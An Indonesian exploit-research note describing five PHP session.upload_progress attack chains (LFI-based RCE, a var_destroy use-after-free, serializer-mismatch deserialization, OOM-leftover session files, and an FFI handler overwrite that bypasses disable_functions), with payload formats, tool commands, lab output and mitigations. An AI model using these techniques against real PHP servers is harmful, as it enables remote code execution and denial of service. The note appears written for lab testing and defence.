# Catatan 04 — Rantai `php2shell` (CVE-2026-109618 / CVE-2026-109619)

> Semua eksperimen di dokumen ini berjalan di **127.0.0.1** terhadap instance
> PHP yang disiapkan sendiri oleh `exploit/php2shell/labctl.py`.
> Repo ini tidak mengarahkan exploit ke sistem pihak ketiga.

Dokumen ini menjelaskan **limap** rantai yang sudah terverifikasi end-to-end di
lab lokal, dipakai bersama exploit di `exploit/php2shell/`.

---

## 0. Ringkasan: mana yang benar-benar dipatch

Ini poin paling penting dari dokumen ini, dan sering disalahpahami.

| Rantai | Gejala | Diperbaiki patch 8.4.27? | Yang benar-benar menutup |
|---|---|---|---|
| **A** — upload_progress → file session → LFI | RCE pre-auth | ❌ **tidak** | mitigasi `session.upload_progress.enabled=0` |
| **B** — UAF `var_destroy()` | worker mati (SIGSEGV) | ❌ **tidak** | mitigasi `session.upload_progress.enabled=0` |
| **C** — handler mismatch → `__destruct` | RCE pre-auth | ❌ **tidak** | mitigasi `session.upload_progress.enabled=0` + seragamkan `session.serialize_handler` |
| **D** — OOM startup → state session basi → RCE | RCE lintas request | ✅ **ya** | patch 8.4.27 (hard OOM) |
| **E** — engine: timpa `handler` internal function | RCE native | ❌ **tidak** | mitigasi `ffi.enable` + `disable_functions` |

Hanya **Chain D** yang benar-benar hilang setelah patch. A, B, C, dan E tetap
hidup di PHP 8.4.27 — yang berubah cuma **mitigasi konfigurasi** yang
disarankan advisory, yaitu `session.upload_progress.enabled = 0`.

> Klaim "CVE-2026-109618 sudah dipatch, jadi aman" **tidak berlaku** untuk
> rantai A/B/C. Fitur `session.upload_progress` masih ada persis seperti
> semula di 8.4.27; yang hilang adalah *jalur OOM yang bocor state*.

---

## 1. Permukaan attack yang sama: `session.upload_progress`

Semua rantai (A, B, C, D) bertumpu pada satu mekanisme di
`ext/session/session.c`: handler rfc1867 yang dipanggil **sebelum script
aplikasi dieksekusi**, ketika parser multipart masih berjalan.

Sumber otoritatif (PHP 8.4.11, `ext/session/session.c`):

```c
case MULTIPART_EVENT_FORMDATA: {
    ...
    } else if (name_len == strlen(PS(rfc1867_name))
               && memcmp(data->name, PS(rfc1867_name), name_len + 1) == 0) {
        smart_str_free(&progress->key);
        smart_str_appends(&progress->key, PS(rfc1867_prefix));   /* "upload_progress_" */
        smart_str_appendl(&progress->key, *data->value, value_len);/* <-- nilai field PENYERANG */
        smart_str_0(&progress->key);
        progress->apply_trans_sid = APPLY_TRANS_SID;
        php_session_rfc1867_early_find_sid(progress);
    }
}

case MULTIPART_EVENT_FILE_START: {
    ...
    add_assoc_string_ex(&progress->current_file, "name", sizeof("name") - 1,
                        *data->filename);   /* <-- filename PENYERANG, tanpa sanitasi */
    ...
    php_session_rfc1867_update(progress, 0);   /* menulis session ke disk */
}

case MULTIPART_EVENT_END: {
    if (Z_TYPE(progress->sid) && progress->key.s) {
        if (PS(rfc1867_cleanup)) {
            php_session_rfc1867_cleanup(progress);   /* <-- HAPUS progress */
        }
        ...
    }
}
```

Tiga konsekuensi yang exploited:

1. **Nilai field `PHP_SESSION_UPLOAD_PROGRESS` masuk mentah** ke nama variabel
   session (`upload_progress_<nilai>`).
2. **Atribut `filename` masuk mentah** ke array progress (`name`).
3. **Pembersihan hanya terjadi di `MULTIPART_EVENT_END`.** Kalau request mati
   lebih dulu (OOM), file session tertinggal di disk dengan payload di
   dalamnya → inilah Chain D.

Kontrol konfigurasi yang relevan:

```c
STD_PHP_INI_BOOLEAN("session.upload_progress.enabled", "1", ZEND_INI_PERDIR, ...)
STD_PHP_INI_BOOLEAN("session.upload_progress.cleanup", "1", ZEND_INI_PERDIR, ...)
STD_PHP_INI_ENTRY("session.upload_progress.name", "PHP_SESSION_UPLOAD_PROGRESS", ...)
STD_PHP_INI_ENTRY("session.upload_progress.prefix", "upload_progress_", ...)
```

Semua **default `On`** di build upstream. Repo ini tidak mengubahnya di
instance vulnerable; instance `apache-mitigated` (8095) yang_dimatikan
untuk menguji batas dampaknya.

### 1.1 Dua vektor penempatan payload

Ada dua jalan untuk menitipkan bytes milik penyerang ke file session, dan
keduanya dipakai repo ini:

| Vektor | Cara | Batas karakter | Kapan dipakai |
|---|---|---|---|
| `filename` | atribut `filename="..."` di `Content-Disposition` | **tanpa `"`** (nilai disimpan di `s:N:"..."`) | default; pola Chain A |
| `key` | nilai field `PHP_SESSION_UPLOAD_PROGRESS` | **tanpa `|`** (key yang ditulis sebelum delimiter) | payload panjang / butuh `"` |

Format file session dengan serializer `php` (default upstream):

```
nama_variabel|serialized_value
```

Jadi:

* nilai variabel = bagian **sesudah** `|` → harus berupa string serialized
  yang valid → karakter `"` di dalamnya harus di-escape sebagai `\"` di
  header multipart, dan di file session tetap muncul sebagai `"` di dalam
  `s:N:"..."`. Meaning: payload yang butuh kutip HARUS lewat vektor `key`.
* key variabel = bagian **sebelum** `|` → ditulis mentah, boleh berisi `"`.

Perlu dicek empiris: apakah ada batas panjang? **Tidak.** Diperiksa
empiris pada 8.4.11 dan 8.4.27: payload `filename` sepanjang **9018 byte**
utuh masuk ke file session. Klaim lama bahwa ada limit 5120 byte ternyata
tidak berlaku pada build ini.

---

## 2. Chain A — RCE pre-auth lewat LFI (anchor)

**Tool:** `exploit/php2shell/chain_a_session_lfi.py`
**Butuh:** `session.upload_progress.enabled=On` + sink `include` yang path-nya
dikendalikan penyerang.

Alur:

```
POST /plain.php  (multipart, filename berisi payload)
   └─ parser rfc1867 → MULTIPART_EVENT_FILE_START
        └─ filename mentah masuk progress["files"][0]["name"]
             └─ php_session_rfc1867_update() → session di-flush ke disk
                  └─ file sess_<SID> memuat: ...s:NN:"<?php ...payload...";
GET /lfi.php?page=/path/ke/sess_<SID>
   └─ include file session → payload dieksekusi → RCE
```

Dua detail teknis yang menentukan keberhasilan:

* **Payload harus berada di dalam string berkutip dua** di file session, jadi
  tidak boleh mengandung `"` mentah. Repo ini menutupi ini dengan
  `common.php_marker_payload()`: payload di-*base64* lalu `base64_decode()`
  di dalam PHP, sehingga isinya bebas karakter apa pun kecuali `"`.
* **Race dengan cleanup.** File session hanya hidup selama upload berjalan.
  Tool mengirim body secara *trickle* (chunk kecil + jeda), menunggu file
  muncul di disk, baru menembak LFI. Diperlukan karena
  `MULTIPART_EVENT_END` menghapus progress segera setelah body selesai.

### 2.1 Bukti (keluaran nyata lab, port 8093)

```
$ python3 exploit/php2shell/chain_a_session_lfi.py -t http://127.0.0.1:8093 -c 'id'
[*] target      : http://127.0.0.1:8093
[*] session dir : exploit/php2shell/run/apache-vuln/sessions
[*] command     : id
[*] upload      : 2097152 byte trickle (16384 byte/chunk, delay 0.01s)
[*] [percobaan 1] SID=exploit7f3a91c2b40d3e5a
[+] RCE BERHASIL -> uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),...
```

### 2.2 Catatan jujur

Chain A **tidak butuh** bug memory. Yang dibutuhkan cuma fitur default PHP +
sink LFI di aplikasi. Patch CVE-2026-109618/619 **tidak** menutupnya; yang
menutupnya hanya `session.upload_progress.enabled=0`.

---

## 3. Chain B — UAF `var_destroy()` (kandidat CVE-2026-109619)

**Tool:** `exploit/php2shell/chain_b_uaf.py`

Sumber otoritatif: `ext/standard/var_unserializer.re` / `.c`.

```c
void var_destroy(php_unserialize_data_t *var_hashx) {
    var_entries *var_hash = (*var_hashx)->entries.next;
    while (var_hash) {                         /* FASE 1: bebaskan chunk */
        next = var_hash->next;
        efree_size(var_hash, sizeof(var_entries));
        var_hash = next;
    }
    while (var_dtor_hash) {                    /* FASE 2: jalankan __destruct */
        ...
        i_zval_ptr_dtor(zv);                   /* __destruct user-defined */
    }
}
```

Objek yang masuk *dtor list* (mis. karena kuncinya duplikat pada format
serialized `php`) menjalankan `__destruct`-nya pada **fase 2**, yaitu setelah
chunk `var_entries` **sudah di-`efree`**. `__destruct` yang dipanggil di sana
masih memakai `var_hash` yang sama (`BG(unserialize).data` belum di-free),
sehingga `var_push()` menulis ke chunk yang sudah dibebaskan →
**heap-use-after-free**.

### 3.1 Mengapa butuh 1018 elemen

`sizeof(var_entries)` = **8160 byte** (lihat `var_unserializer.h`), dan
`var_push()` memakai chunk tambahan setelah 1018 nilai:

```c
#define VAR_ENTRIES_HASH_SIZE ...
/* di var_push(): */
if (var_hash->used_slots == VAR_ENTRIES_MAX) {   /* 1018 */
    /* alokasi chunk tambahan 8160 byte */
}
```

Payload butuh **1019** nilai agar satu chunk tambahan teralokasi — chunk itu
yang dibebaskan `var_destroy()` pada fase 1 dan ditulis ulang pada fase 2.

### 3.2 Mengapa crash, bukan "hanya selesai"

Supaya efeknya kelihatan (bukan "tidak ada error"), gadget melakukan *spray*
sebelum operasi lain di `__destruct`:

1. `str_repeat('A', 8000)` → string 8000 byte. `sizeof(var_entries)` = 8160
   byte, keduanya masuk size class 8192 → string ini **merebut slot chunk yang
   baru saja di-`efree`**. Isi string (refcount/type_info di offset 0)
   sekarang dibaca sebagai pointer `used_slots` chunk yang sudah dibebaskan.
2. Nested `unserialize('a:1:{i:0;N;}')` → `var_push()` menulis zval ke
   `data[used_slots]`, dengan `used_slots` kini berisi garbage besar →
   alamat di luar region yang dipetakan → **SIGSEGV**, worker mati.

Urutan itu penting: spray harus lebih dulu, karena alokasi stream/berkas
di `__destruct` bisa saja merebut slot yang baru dibebaskan.

### 3.3 Rantai penuhnya

```
PRODUCER : POST multipart, field PHP_SESSION_UPLOAD_PROGRESS = "x|<payload serialized>"
           → key session mentah: upload_progress_x   (payload = key, bukan value!)
CONSUMER : GET dengan serializer 'php'
           → decoder 'php' memotong pada '|' pertama → unserialize(payload)
           → array dengan kunci duplikat → objek masuk dtor list
           → sisa data membuat decode GAGAL → var_destroy()
           → fase 2 → __destruct gadget → UAF write → SIGSEGV
```

### 3.4 Bukti (keluaran nyata lab)

```
$ python3 exploit/php2shell/chain_b_uaf.py -t http://127.0.0.1:8093
[*] payload     : 12092 byte serialized, 1018 elemen
[+] MEMORI KORUP: worker mati (signal 11)
[+] __destruct gadget terpanggil:
destruct fired pid=1234 sapi=apache2handler
  AH00558: Child 1234 exit signal Segmentation fault (11)
```

### 3.5 Catatan jujur

* Yang dibuktikan tool ini adalah **korupsi memori (DoS)**, bukan RCE native.
  UAF-nya sudah proven, tapi mengubahnya jadi *write ke alamat pilihan*
  butuh heap-grooming yang belum dikerjakan di repo ini.
* Chain B **tidak diperbaiki** patch 8.4.27 — worker tetap mati di build
  patched (lihat matriks di `exploit/php2shell/README.md`).
* Yang menutupinya: `session.upload_progress.enabled=0`.

---

## 4. Chain C — RCE lewat "handler mismatch"

**Tool:** `exploit/php2shell/chain_c_mismatch_rce.py`
**Butuh:** `session.serialize_handler` **berbeda** antara request producer dan
consumer. **Tidak butuh LFI.**

Decoder serializer `php` (default upstream) memotong data pada karakter `|`
**pertama**, lalu memperlakukannya sebagai `nama_variabel|nilai`, dan
nilai-nya di-`unserialize()`:

```
PRODUCER (serializer = php_serialize)
  file session: a:1:{s:23:"upload_progress_x";a:6:{...;s:4:"name";s:NN:"x|O:4:\"Evil\":1:{...}";...}}}

CONSUMER (serializer = php)
  decoder 'php' -> potong di '|' pertama -> unserialize("O:4:\"Evil\":1:{...}")
  -> objek Evil BERHASIL dibuat
  -> data sisa -> decode GAGAL -> var_destroy() -> __destruct() -> RCE
```

Dua detail yang membuatnya bekerja:

1. **Nilai `filename` harus memuat karakter `|`.** Decoder `php` memotong di
   `|` pertama di seluruh file session. Karena `filename` ditulis sebagai
   `s:NN:"..."` *di dalam* struktur `php_serialize`, `|` pertama itu milik
   payload kita.
2. **Atribut multipart di-escape.** Nilai `filename="..."` diparse oleh
   `substring_conf()` (`main/rfc1867.c`) yang **berhenti di kutip pertama**,
   kecuali kutip itu di-escape dengan backslash. Jadi `"` di payload ditulis
   sebagai `\"` di header, dan `\` sendiri jadi `\\`
   (`chain_c_mismatch_rce.escape_header_value()`).

### 4.1 Bukti (keluaran nyata lab)

```
$ python3 exploit/php2shell/chain_c_mismatch_rce.py -t http://127.0.0.1:8093 -c 'id'
[*] payload     : x|O:4:"Evil":1:{s:3:"cmd";s:4:"aWQNCmRm";}
[+] RCE BERHASIL -> __destruct terpicu
cmd=id
pid=1234
sapi=apache2handler
out=uid=1000(kali) gid=1000(kali) groups=...
```

### 4.2 Catatan jujur — radius ledaknya

Chain C butuh **mismatch konfigurasi**, bukan aplikasi yang rusak. Di dunia
nyata ini muncul dari:

* `fastcgi_param PHP_VALUE ...` per-location di nginx,
* `php_value` / `php_admin_value` per-direktori atau per-vhost di Apache,
* `.user.ini` di shared hosting,
* `session.serialize_handler` yang di-`ini_set()` dari kode aplikasi.

Itu kondisi **konfigurasi**, bukan kerentanan aplikasi. Justru karena begitu,
seragamkan `session.serialize_handler` di semua direktori adalah mitigasi yang
wajar (tidak selalu praktis, tapi selalu mungkin di konfigurasi statis).

---

## 5. Chain D — OOM saat request startup → state session basi → RCE

**Tool:** `exploit/php2shell/chain_d_oom_stale.py`
**Ini satu-satunya rantai yang benar-benar diperbaiki patch 8.4.27.**

### 5.1 Amplifikasi header multipart

Differensial di `core-cve/RESULTS.md` menunjukkan amplifikasi **≈79×**: pada
build 8.4.11, 200.000 header pendek (`"X:\r\n"`, 4 byte di wire) memakai
**31,5 MB** heap, sedangkan 8.4.27 hanya **350 KB** (konstan).

| header per part | wire | 8.4.11 | 8.4.27 |
|---:|---:|---:|---:|
| 100.000 | 0,38 MB | 31.549.960 B heap | 350.104 B |
| 200.000 | 0,76 MB | **HTTP 500 — OOM saat startup** | 350.104 B |

Header HTTP di-`php_stream_parse` → dikonversi jadi entri `sapi_header` /
hash internal ±315 byte per header. Di 8.4.11 semua header itu ditumpuk di
reqwest; di 8.4.27 permintaan sudah dibatasi.

### 5.2 Rantainya

```
PRODUCER: POST multipart dengan DUA part:
  part 1: filename berisi payload RCE  -> session ditulis ke disk (FILE_START)
  part 2: 200.000 header "X:\r\n"       -> BOROS ~63 MB -> OOM saat startup
  OOM terjadi DI TENGAH parsing multipart:
    - request mati HTTP 500 ("Allowed memory size of 33554432 bytes exhausted
      ... in Unknown on line 0" = OOM di fase request startup)
    - MULTIPART_EVENT_END TIDAK PERNAH terjadi
    - php_session_rfc1867_cleanup() tidak jalan
    -> FILE SESSION TETAP ADA DI DISK dengan payload di dalamnya (state basi)

CONSUMER: request BERBEDA (bisa dilayani worker lain) me-include file session
  basi itu lewat sink LFI -> payload dieksekusi -> RCE
```

Tidak ada race condition: file dijamin masih ada karena producer mati
**sebelum** cleanup.

### 5.3 Bukti diferensial (keluaran nyata lab)

```
$ python3 exploit/php2shell/chain_d_oom_stale.py --compare 8093 8094
[*] probe instance apache-vuln (port 8093)
[*] probe instance apache-fixed (port 8094)

=== RINGKASAN ===
  port 8093 (apache-vuln)
    producer   : HTTP 500 (body 803000 byte)
    state bocor: YA (file session 421 byte, payload di file: ya)
    log        : PHP Fatal error:  Allowed memory size of 33554432 bytes exhausted
    RCE        : BERHASIL -> kali
  port 8094 (apache-fixed)
    producer   : HTTP 200 (body 803000 byte)
    state bocor: TIDAK (file session 0 byte, payload di file: tidak)
    RCE        : TIDAK (payload tidak dieksekusi)

  diferensial: BERBEDA (A bocor, B tidak)
```

### 5.4 Catatan jujur

* Rantai ini butuh **dua hal**: fitur `session.upload_progress` aktif
  (default upstream) **dan** sink LFI. Tanpa sink LFI, yang terbukti hanya
  "state session bocor antar request" (bocor data sesi, bukan RCE).
* OOM-nya adalah OOM di `memory_limit` PHP, **bukan** OOM di kernel. Efek ke
  sistem lain (swap, OOM killer) di luar cakupan lab ini.
* Patch 8.4.27 memperbaiki ini dengan mengganti `longjmp()` handling OOM
  dengan soft OOM di VM safe point + hard OOM via `_exit()`.

---

## 6. Chain E — engine: overwrite `handler` internal function

**Tool:** `exploit/php2shell/chain_b_engine.py` + `chain_b_engine_uaf.php`
**Butuh:** `ffi.enable=1` (default upstream adalah `preload` → FFI tidak bisa
dipakai di request normal).

### 6.1 Yang dilakukan

1. Payload PHP (dibungkus base64, di-`eval`) masuk ke file session lewat
   vektor `filename` (default) atau `key`.
2. File session di-`include` lewat sink LFI lab → payload dievaluasi.
3. Payload memakai FFI untuk:
   * menemukan `executor_globals` → `function_table`,
   * mencari `zend_internal_function` dari fungsi sumber (mis. `system`),
   * mencari **offset field `handler` di runtime** (tidak di-hardcode),
   * **menulis** pointer handler fungsi sumber ke field `handler` fungsi
     target (mis. `printf`),
   * memanggil fungsi target → yang jalan adalah implementasi fungsi
     sumber → perintah dieksekusi native.
4. Output perintah muncul di body respons LFI (di antara marker).

Mode tambahan `--source ffi-libc`: panggil `popen()` lewat FFI, baca hasilnya
lewat `fread()`. Ini penting karena `system()` di libc menulis ke **fd 1**,
yang tidak masuk body respons HTTP — dengan `popen`+`fread` output-nya
tertangkap.

### 6.2 Catatan jujur — ini BUKAN hasil UAF Chain B

> Primitive "tulis ke memori" pada tool ini datang dari **FFI**
> (`ffi.enable=1`), **bukan** dari use-after-free Chain B.
>
> UAF Chain B (`chain_b_uaf.py`) menghasilkan write liar yang menjatuhkan
> worker; menjadikan write itu "write ke alamat pilihan" butuh heap-grooming
> yang belum dikerjakan.
>
> Yang dibuktikan Chain E adalah **AKHIR jalurnya**: begitu ada write
> primitive, menimpa handler internal function sudah cukup untuk RCE native —
> termasuk RCE yang tetap jalan ketika `disable_functions` mematikan
> `system`/`exec`/`shell_exec`/`passthru`/`proc_open` (pakai `--source popen`).

### 6.3 Engineering notes (hasil eksplorasi runtime)

* **Layout `zend_array`**: `EG(function_table)` adalah `HashTable`; entri
  `zend_function` bertipe `zend_internal_function`. Ukuran `zend_array`
 Field `handler` ditemukan **pada runtime** dengan
  membandingkan alamat implementasi yang dipanggil `system` dan `printf`,
  lalu memindai offset yang sama — **tidak ada offset hardcode** di payload.
* **`zend_internal_function.handler`**: offset **88** pada build x86-64
  (dicek ulang tiap runtime, bukan diasumsikan).
* **`var_entries` 8160 byte**: `sizeof(var_entries)` menghasilkan size class
  8192 — dipakai Chain B untuk menyamarkan chunk yang dibebaskan.
* **Serializer `php` menulis key mentah sebelum `|`**: dipakai untuk memuat
  payload berisi `"` (vektor `key`).
* **FFI quirks** (menghemat banyak waktu):
  * `cast("uint64_t", $ptr)` = **dereference**, bukan cast pointer →
    untuk baca pointer pakai `cast("uint64_t*", $addr)[$i]`.
  * Pointer arithmetic tidak didukung FFI.
  * `dladdr()` lewat FFI → **crash**; pakai `/proc/self/maps` untuk
    resolusi simbol.
  * FPM di Debian: `/etc/php/8.4/fpm/conf.d` **kosong** → instance FFI
    memuat `ffi.so` manual lewat `extension=` di php.ini instance.

### 6.4 Bukti (keluaran nyata lab)

```
$ python3 exploit/php2shell/chain_b_engine.py -t http://127.0.0.1:8100 -c 'id'
[*] source      : auto
[*] vector      : filename
[+] RCE NATIVE BERHASIL (handler internal function ditimpa)
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),...

$ python3 exploit/php2shell/chain_b_engine.py -t http://127.0.0.1:8100 \
      -c 'id -un' --source ffi-libc
[+] RCE NATIVE BERHASIL (libc dipanggil lewat FFI)
kali
```

Instance `apache-vuln-ffi-nodf` (port 8104) punya
`disable_functions=system,exec,shell_exec,passthru,proc_open`; di sana
`--source` otomatis fallback ke `popen` dan RCE tetap jalan.

---

## 7. Ringkasan radius ledak

| Rantai | Butuh aplikasi rusak? | Butuh konfigurasi non-default? | Praktis di dunia nyata? |
|---|---|---|---|
| A | **ya** (sink LFI) | tidak | tinggi — LFI + upload progress sangat umum |
| B | tidak | tidak | tinggi sebagai DoS |
| C | tidak | **ya** (handler mismatch) | sedang — sering terjadi tak sengaja di hosting |
| D | **ya** (sink LFI) | tidak | sedang — butuh LFI + memory_limit kecil |
| E | **ya** (sink LFI) | **ya** (`ffi.enable=1`) | rendah — FFI nonaktif secara default |

---

## 8. Rekomendasi perbaikan (ringkas)

1. `session.upload_progress.enabled = 0` — mitigasi resmi advisory; menutup
   A, B, C, D sekaligus.
2. Upgrade ke PHP ≥ 8.4.27 — menutup **hanya** Chain D.
3. Seragamkan `session.serialize_handler` di semua direktori/vhost/path —
   menutup Chain C secara konfigurasi.
4. Tutup sink `include`/`require` yang path-nya dari user input (allow-list).
5. `ffi.enable = Off` (atau `preload`) + `disable_functions` yang benar —
   menutup Chain E.
6. Batasi jumlah header HTTP (`LimitRequestFields`) — mengurangi permukaan
   amplifikasi OOM.
7. WAF: tolak multipart dengan jumlah header/field yang anomali.

Rincian + artefak siap-pakai ada di [`../defense/README.md`](../defense/README.md).
